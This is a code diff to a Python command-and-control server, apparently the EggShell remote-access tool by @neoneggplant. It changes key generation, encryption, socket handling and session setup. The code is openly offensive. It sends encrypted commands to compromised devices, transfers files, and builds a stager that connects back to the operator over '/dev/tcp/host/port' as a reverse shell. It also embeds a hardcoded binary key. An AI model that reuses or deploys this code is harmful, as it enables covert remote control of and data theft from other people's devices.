@@ -17,8 +17,8 @@ from threading import Thread
 from src.encryption.ESEncryptor import ESEncryptor
 
 #MARK: Globals
-shellKey = ''.join((random.choice(string.letters+string.digits+"*")) for x in range(32))
-terminator = ''.join((random.choice(string.letters+string.digits+"*")) for x in range(16))
+shellKey = ''.join((random.choice(string.letters+string.digits)) for x in range(32))
+terminator = ''.join((random.choice(string.letters)) for x in range(16))
 escrypt = ESEncryptor(shellKey,16)
 datadir = "data"
 sessions = {}
@@ -47,7 +47,7 @@ BANNER_ART_TEXT = GREEN+"""
  _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
 |_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
                     l
-"""+WHITE+"\nVersion: 2.0.9.3\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
+"""+WHITE+"\nVersion: 2.0.9.4\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
 BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     1): Start Server
     2): Start Multi Session
@@ -90,14 +90,7 @@ binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"
 
 #TODO: should really take out whitespace eventually
 def encryptStr(string,cypter=escrypt):
-    length = len(string)
-    result = ""
-    x = 0
-    while x < length:
-        chunk = string[x:x+12]
-        result += cypter.encode(chunk)
-        x+=12
-    return result
+    return cypter.encode(string)#result
 
 #MARK: String Formatting/Convenience
 def strinfo(this):
@@ -298,7 +291,7 @@ def sendCMD(cmd,conn):
     conn.send(encryptStr(cmd))
     try:
         data = receiveString(conn)
-        if data != "":
+        if data:
             print data
     except:
         print receiveString(conn)
@@ -309,17 +302,19 @@ def sendCMD(cmd,conn):
 def receiveString(conn):
     data = ""
     while 1:
-        data += conn.recv(2048)
+        data += conn.recv(1024)
         if not data:
-            return "oops, something went wrong, disconnecting"
-        #terminator to notify when we are done receiving data
-        #useful for getting however much data we want
+            return "something went wrong"
+        #terminator when we are done receiving data
         if terminator in data:
-            data = data.replace(terminator,"")
-            result = bbde(escrypt.decode(data))
-            if result == "-1":
-                result = "invalid command"
-            return result
+            data = data.split(terminator)[0]
+            try:
+                result = escrypt.decrypt(data)
+                if result == "-1":
+                    result = "invalid command"
+                return result.rstrip()
+            except Exception as e:
+                return str(e)
 
 #MARK: File Transfers
 def uploadFile(fileName,location,conn):
@@ -495,7 +490,7 @@ class SessionHandler:
         self.host = host
         self.port = port
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
-        INSTRUCT_BINARY_ARGUMENT = bben(encryptStr(str(host)+" "+str(port)+" "+shellKey+" "+terminator,ESEncryptor(binaryKey,16)))
+        INSTRUCT_BINARY_ARGUMENT = encryptStr(str(host)+" "+str(port)+" "+shellKey+" "+terminator,ESEncryptor(binaryKey,16))
         INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -561,10 +556,7 @@ class SessionHandler:
             print strinfo("Waiting For Connection...")
         conn, hostAddress = s.accept()
         data = receiveString(conn)
-        lafix = Thread(target = delayfive, args=(s,))
-        lafix.daemon=True
-        lafix.start()
-        if data: #payload should return the name of the device and we will use that as our prompt
+        if data:
             self.uid = data.split(" ")[0]
             data = data.replace(self.uid+" ","")
             name = UNDERLINE_GREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
@@ -575,11 +567,6 @@ class SessionHandler:
             s.close()
             return [name,conn,host,port,CDA]
 
-def delayfive(s):
-    time.sleep(5)
-    s.close()
-    s.close()
-            
 #MARK: MultiServer
 
 def multiServer(host,port):
@@ -608,7 +595,6 @@ def multiServer(host,port):
         sys.stdout.flush()
         x += 1
 
-        
 def multiServerSessionInteract(args):
     if len(args) == 2:
         try:
